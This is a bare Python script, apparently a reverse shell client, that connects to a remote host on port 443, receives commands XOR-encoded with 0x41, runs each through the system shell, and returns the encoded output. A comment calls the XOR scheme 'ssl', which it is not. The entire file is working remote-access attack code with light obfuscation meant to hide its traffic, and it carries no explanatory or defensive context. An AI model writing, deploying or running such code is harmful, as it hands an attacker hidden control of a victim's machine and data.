import socket, subprocess, sys

RHOST = '127.0.0.1' #sys.argv[1]
RPORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

while True:
    #receive encoded data
    en_comm = s.recv(1024)
    #decoded the received command
    de_comm = bytearray(en_comm)
    for i in range(len(de_comm)):
        de_comm[i] ^= 0x41

    #execute the clear text comamnd after decode it
    clrtxt_comm = subprocess.Popen(str(de_comm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, STDERR = clrtxt_comm.communicate()

    #encode the command output and send it over ssl
    en_output = bytearray(output)
    for i in range(len(en_output)):
        en_output[i] ^= 0x41
    s.send(en_output)

s.close()